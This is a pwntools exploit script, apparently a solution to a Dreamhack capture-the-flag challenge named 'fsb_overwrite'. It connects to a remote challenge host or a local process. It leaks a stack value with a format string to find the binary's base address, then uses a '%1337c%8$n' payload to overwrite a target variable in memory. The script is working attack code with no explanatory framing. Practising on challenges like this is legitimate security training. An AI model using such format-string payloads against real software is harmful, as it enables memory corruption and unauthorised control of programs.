#!/usr/bin/python3

from pwn import *

exe = ELF("./fsb_overwrite_patched")
libc = ELF("./libc.so.6")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+59
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 15598)
else:
    p = process([exe.path])
GDB()

s(b'%15$p')
binary_leak = int(p.recvline()[:-1], 16)
binary_base = binary_leak - 0x1293
log.info("binary_leak :" + hex(binary_leak))
log.info("binary_base :" + hex(binary_base))

changeme = binary_base + 0x401c

s(f"%1337c%8$n".encode() + b'a' * 6 + p64(changeme))

p.interactive()

